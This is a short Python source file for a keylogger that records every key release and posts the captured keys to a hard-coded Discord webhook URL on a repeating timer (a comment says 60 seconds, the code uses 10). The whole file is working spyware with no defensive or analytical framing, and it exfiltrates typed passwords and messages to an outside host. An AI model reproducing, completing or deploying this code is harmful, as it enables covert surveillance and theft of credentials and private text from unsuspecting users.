import keyboard
import time
import requests
import threading

WEBHOOK_URL = "https://discord.com/api/webhooks/1013901525271187531/BOTTQOVq5keG_xHN005naDv2doLSALlk66nJv1uhoLhZPjpXAidVzL2ScT8izSUZHGwz"

# Create a list to store the captured keystrokes
keylogs = []

# Function to send keylogs to Discord
def send_keylogs():
    global keylogs

    # Check if there are any keylogs to send
    if keylogs:
        # Convert the keylogs to a string
        keylogs_str = '\n'.join(keylogs)

        # Create the payload for the webhook
        payload = {
            'content': keylogs_str
        }

        # Send the payload to the Discord webhook
        requests.post(WEBHOOK_URL, data=payload)

        # Clear the keylogs list
        keylogs = []

    # Schedule the next execution of the function after 60 seconds
    threading.Timer(10, send_keylogs).start()

# Function to capture keystrokes
def capture_keystrokes(event):
    global keylogs

    # Append the captured keystroke to the keylogs list
    keylogs.append(event.name)

# Start capturing keystrokes
keyboard.on_release(callback=capture_keystrokes)

# Start sending keylogs to Discord every 60 seconds
send_keylogs()



# Keep the script running
while True:
    time.sleep(1)
